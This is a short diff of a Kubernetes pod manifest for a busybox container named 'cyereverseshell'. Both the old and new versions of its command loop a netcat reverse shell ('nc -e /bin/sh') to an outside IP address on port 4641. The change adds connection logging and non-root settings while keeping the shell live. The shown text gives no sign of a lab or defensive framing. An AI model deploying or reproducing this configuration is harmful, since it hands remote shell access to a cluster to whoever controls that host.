@@ -9,7 +9,7 @@ spec:
   containers:
   - name: cyereverseshell
     image: busybox
-    args: ["/bin/sh", "-c", "while true; do nc -vvv 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
+    args: ["/bin/sh", "-c", "while true; do echo 'Connecting...'; nc -e /bin/sh 68.183.22.232 4641 || echo 'Connection failed'; sleep 10; done"]
     securityContext:
       runAsNonRoot: true  # Ensure the container does not run as root
       runAsUser: 1000  # Set non-root UID
